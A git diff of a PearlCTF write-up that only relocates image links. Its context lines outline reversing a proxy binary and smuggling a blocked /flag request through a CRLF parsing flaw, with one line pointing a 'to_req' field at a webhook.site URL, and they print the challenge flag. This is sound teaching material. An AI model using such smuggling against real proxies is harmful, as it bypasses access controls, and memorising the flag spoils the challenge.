@@ -4,24 +4,24 @@ We are provided with a binary which acts as the proxy.
 
 Opening the binary in ghidra and seeing the main function
 
-![main function](main_fn.png)
+![main function](imgs/main_fn.png)
 
 We can see the main function, following the function we get that a closure is called in a thread.
 
-![closure function](closure_fn.png)
+![closure function](imgs/closure_fn.png)
 
 we find the references of this closure, we get to a function where we find handle connection function
 
-![refernce](reference.png)
-![handle function](handle_fn.png)
+![refernce](imgs/reference.png)
+![handle function](imgs/handle_fn.png)
 
 following the function, we find parse function
 
-![parse](parse_fn.png)
+![parse](imgs/parse_fn.png)
 
 now we analyse the function and find out that the request is splitted with `\r\n`
 
-![split](split.png)
+![split](imgs/split.png)
 
 so if the body also had a `\r\n`, it will be splitted.
 
@@ -39,7 +39,7 @@ so the content length will be the length of `foo=bar` only, and the function sen
 
 Also to make the player reverse the binary, we added a custom header which is verified in the proxy `ctf: PearlCTF`
 
-![header](custom_header.png)
+![header](imgs/custom_header.png)
 
 the `/flag` request is blocked in the proxy, so we needed to smuggle it.
 
@@ -61,7 +61,7 @@ Content-Type: application/x-www-form-urlencoded
 to_req=https://webhook.site/7c0b4f46-d927-4d8e-8601-3d70d049fe4c
 ```
 
-![flag](flag.png)
+![flag](imgs/flag.png)
 
 ## Flag
 `pearl{I_sh0uld_h4v3_t3sted_mY_pR0xY}`
